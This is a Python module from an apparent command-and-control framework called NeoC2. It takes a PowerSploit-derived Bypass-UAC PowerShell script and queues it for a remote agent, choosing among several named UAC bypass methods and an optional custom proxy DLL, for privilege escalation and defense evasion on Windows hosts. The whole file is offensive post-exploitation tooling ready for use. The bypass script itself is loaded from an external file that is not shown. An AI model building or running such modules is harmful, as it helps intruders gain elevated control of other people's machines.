import os
import json
import base64
import re

def get_info():
    """Get module information"""
    return {
        "name": "Bypass-UAC",
        "description": "Execute a PowerShell Bypass-UAC script for User Access Control bypass techniques",
        "type": "uac",
        "platform": "windows",
        "author": "NeoC2 Framework",
        "references": ["https://github.com/PowerShellMafia/PowerSploit"],
        "technique_id": "T1548.002",  # Abuse Elevation Control Mechanism: Bypass User Access Control
        "mitre_tactics": ["Privilege Escalation", "Defense Evasion"],
        "options": {
            "agent_id": {
                "description": "ID of the agent to run Bypass-UAC on",
                "required": True
            },
            "method": {
                "description": "The UAC bypass method to execute. Available methods: UacMethodSysprep, ucmDismMethod, UacMethodMMC2, UacMethodTcmsetup, UacMethodNetOle32",
                "required": True,
                "default": "UacMethodTcmsetup"
            },
            "custom_dll": {
                "description": "Absolute path to custom proxy DLL (optional)",
                "required": False,
                "default": ""
            }
        }
    }

def execute(options, session):
    """Execute the Bypass-UAC module with given options and session"""
    agent_id = options.get("agent_id")
    method = options.get("method", "UacMethodTcmsetup")
    custom_dll = options.get("custom_dll", "")
    
    if not agent_id:
        return {
            "success": False,
            "error": "agent_id is required"
        }
    
    allowed_methods = [
        "UacMethodSysprep", "ucmDismMethod", "UacMethodMMC2", 
        "UacMethodTcmsetup", "UacMethodNetOle32"
    ]
    
    if method not in allowed_methods:
        return {
            "success": False,
            "error": f"Invalid method: {method}. Must be one of: {', '.join(allowed_methods)}"
        }
    
    if custom_dll and not re.match(r'^[a-zA-Z0-9._\\\-: ]+$', custom_dll):
        return {
            "success": False,
            "error": f"Invalid custom_dll path: {custom_dll}. Contains invalid characters."
        }

    session.current_agent = agent_id

    script_path = os.path.join(os.path.dirname(__file__), 'external', 'Bypass-UAC.ps1')
    try:
        with open(script_path, 'r', encoding='utf-8') as f:
            original_script = f.read()
    except FileNotFoundError:
        return {
            "success": False,
            "error": f"Could not find Bypass-UAC script at {script_path}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error reading Bypass-UAC script: {str(e)}"
        }

    if custom_dll:
        execution_command = f"{original_script}\nBypass-UAC -Method {method} -CustomDll \"{custom_dll}\""
    else:
        execution_command = f"{original_script}\nBypass-UAC -Method {method}"

    powershell_command = execution_command

    if not hasattr(session, 'agent_manager') or session.agent_manager is None:
        return {
            "success": False,
            "error": "Session does not have an initialized agent_manager"
        }

    try:
        agent_manager = session.agent_manager
        task_id = agent_manager.add_task(agent_id, powershell_command)
        if task_id:
            return {
                "success": True,
                "output": f"Bypass-UAC task {task_id} queued for agent {agent_id}",
                "task_id": task_id,
                "method": method,
                "custom_dll": custom_dll if custom_dll else "None"
            }
        else:
            return {
                "success": False,
                "error": f"Failed to queue task for agent {agent_id}"
            }
    except Exception as e:
        return {
            "success": False,
            "error": f"Error queuing task: {str(e)}"
        }
